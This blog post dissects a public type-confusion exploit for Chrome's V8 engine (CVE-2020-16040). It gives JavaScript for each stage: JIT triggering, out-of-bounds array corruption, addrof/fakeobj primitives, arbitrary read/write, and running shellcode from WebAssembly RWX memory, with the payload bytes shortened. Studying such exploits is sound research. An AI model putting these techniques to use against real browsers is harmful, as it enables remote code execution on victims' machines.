---
layout: post
title:  "Dissecting a Type Confusion Exploit in Chrome's V8 JavaScript Engine"
categories:
---

# Overview
V8 is Google's [JavaScript Engine](https://v8.dev) that runs the Chrome browser, the electron framework, node.js, and much more. This article discusses how attackers use type confusions to gain RCE in the browser sandbox, but does not go into details about the internals of the V8 engine. <br />

This article follows CVE-2020-16040, a type confusion vulnerability with a [public exploit on exploit-db](https://www.exploit-db.com/exploits/49745) by r4j0x00. The Chrome developers released the [bug report](https://bugs.chromium.org/p/chromium/issues/detail?id=1150649) in March 2021. Since then, V8 exploitation has changed quite a bit, however many of the fundamentals discussed here remain the same. <br />

# Exploit Roadmap 
Below are the following high-level steps to exploit a type confusion vulnerability in V8,
<br />
1. Use the vulnerability to corrupt the "length" field of an Array object.
2. Use the corrupted Array object to generate out-of-bounds access primitives on the JS heap.
3. With OOB access, create the *addrof* and *fakeobj* primitives for manipulating JS objects.
4. Use the *addrof* and *fakeobj* functions to create arbitrary read and write functions.
5. Create a RWX segment using WebAssembly.
6. Overwrite the contents of RWX pages with arbitrary read and write functions from step 4. 
7. Pop calculators! 
<br />

Note that one can test this exploit in D8, the command line version of V8. Pre-built binaries of V8 can be found [here](https://commondatastorage.googleapis.com/v8-asan/index.html). This vulnerability was patched in V8 commit reference [71364](https://chromium.googlesource.com/v8/v8/+/ba1b2cc09ab98b51ca3828d29d19ae3b0a7c3a92), so I used version 71363 which can be downloaded [here](https://www.googleapis.com/download/storage/v1/b/v8-asan/o/linux-release%2Fd8-linux-release-v8-component-71363.zip?generation=1606216067630505&alt=media). <br /> 

## Use the corrupt the "length" field of an Array object
In the following JS snippet, "foo", contains the vulnerability exploited in this code. The vulnerability is found in V8's optimizing compiler, TurboFan, and involves the improper treating of signed versus unsigned integers. As one can see, the code here is pretty messed up, but notice that the "foo" function returns two arrays `arr` and `cor`. <br />
{% highlight js %} 
function foo(a) {
  var y = 0x7fffffff;

  if (a == NaN) y = NaN;
  if (a) y = -1;

  let z = y + 1;
  z >>= 31;
  z = 0x80000000 - Math.sign(z|1);

  if(a) z = 0;

  var arr = new Array(0-Math.sign(z));
  arr.shift();
  var cor = [1.1, 1.2, 1.3];

  return [arr, cor];
}
{% endhighlight %}
<br />

`arr` is a JS Array object that will eventually have a length of -1. The exploit then uses this to corrupt the length of the `cor` array that immediately follows it. Note that in V8, adjacent objects in JavaScript will occupy adjacent memory regions on the JS heap. <br /> 
{% highlight js %}
for(var i=0;i<0x3000;++i)
    foo(true);

var x = foo(false);
var arr = x[0];
var cor = x[1];
{% endhighlight %} 
<br />

The above snippet triggers JIT compilation of the "foo" function. JIT compilers, like V8, optimize functions as they run; computerphile as a nice [youtube video](https://www.youtube.com/watch?v=d7KHAVaX_Rs&ab_channel=Computerphile) about how they work. After JIT optimization, the V8 engine makes assumptions based on the input always being `true`. However, it fails to adequately deoptimize the function when the input is `false`. <br />

## Use the corrupted Array object to generate out-of-bounds access primitives on the JS heap
After triggering JIT compilation, the below snippet will created OOB primitives. <br />
{% highlight js %}
const idx = 6;
arr[idx+10] = 0x4242;
{% endhighlight %} 
<br />

Here the `idx` variable is a variable that changes from version to version, based on V8's internal memory representation of JS Array objects. This snippet of code uses the `arr` variable to set `cor.length` to 0x4242. Since the V8 engine is not tracking this, it will result in OOB reads and writes on the JS heap. <br />

![D8 command line](/images/v8-exploitation-breakdown/v8-length-screenshot.png)

<br />

## Creating the *addrof* and *fakeobj* functions
The *addrof* and *fakeobj* functions are well-known function in JIT exploitation. For more information, I recommend reading V8 Security lead Samuel GroÎ²'s [phrack.org article](http://phrack.org/issues/70/9.html#article). <br />

{% highlight js %}
function addrof(k) {
    arr[idx+1] = k;
    return ftoi(cor[0]) & 0xffffffffn;
}

function fakeobj(k) {
    cor[0] = itof(k);
    return arr[idx+1];
}
{% endhighlight %} 
<br />

These functions use the `ftoi` and `itof` functions which are utility functions from the exploit that convert integers to IEEE 754 double precision values and back. *addrof* will leak the memory address of an arbitrary JS object into the JS runtime. *fakeobj* is a bit more complex, it involves tricking V8 into thinking that any blob of memory allocated by the attacker is a JS object. <br />

For analogies in C, imagine that *addrof* works like the "&" operator, and returns the memory address associated with any variable to the attacker. For "fakeobj", imagine that the attacker can cast a pointer to a variable to any type that they choose. <br />

## Creating arbitrary read and write functions
The following code will create arbitrary read and write functions, where an attacker can provide any address to read and write memory from. Both of these functions involves corrupting the backing store of `fake`. In V8, JavaScript Arrays have a backing store pointer; it is a memory address where elements in the array are stored in a linear fashion. The code below uses the variable `arr2` to set the backing store of `fake` to an attacker controlled address. This allows the attacker to read and write arbitrary memory by indexing the `fake` array. <br />

{% highlight js %}
var float_array_map = ftoi(cor[3]);

var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
var fake = fakeobj(addrof(arr2) + 0x20n);

function arbread(addr) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    return (fake[0]);
}

function arbwrite(addr, val) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    fake[0] = itof(BigInt(val));
}
{% endhighlight %} 
<br />

## Allocating RWX memory using WebAssembly
Until surprisingly recently, allocating a WebAssembly function in V8 resulted in RWX segments in memory. This is the perfect spot to fit some shellcode. In modern versions of V8, this is no longer the case. Although there are [documented workarounds](https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_37975/) to this. However, in this version, no additional steps are required and one can allocate RWX memory directly with the following snippet,

<br />
{% highlight js %}
var wasm_code = new Uint8Array([0,97,115,109,1 ...])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
{% endhighlight %}
<br />

Running `cat /proc/$(pidof d8)/maps | grep rwx` will show the RWX memory! 

## Overwrite the contents of the RWX memory with shellcode
In the below snippet, the exploit leaks the address of the RWX memory region from the WebAssembly object from step 5. It will then use the `copy_shellcode` function (omitted) to take the shellcode as integers and write that using the `arbwrite` function. From there, the exploit calls the WebAssembly function `f()` which now contains attacker controlled data. Note that the contents of the wasm_code variable are not important. 

{% highlight js %}
var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
var shellcode = [16889928,16843009,1213202689, ...];
copy_shellcode(rwx_page_addr, shellcode);
f();
{% endhighlight %} 

# Conclusion 
The article walks through an exploit in the V8 JavaScript. In practice, this grants an attacker code execution within the browser sandbox. This is often the first stage in a browser exploit chain, followed by a sandbox escape. <br />

As of writing, more recent versions of V8 have introduced new technical hurdles with V8 exploitation. Most notably is the V8 pointer cage (also called the V8 sandbox, not to be confused with the browser sandbox), which limits pointers inside of the JS heap. This makes acquiring arbitrary read and write primitives significantly more difficult in an exploit. <br />

As always, thanks for reading. 

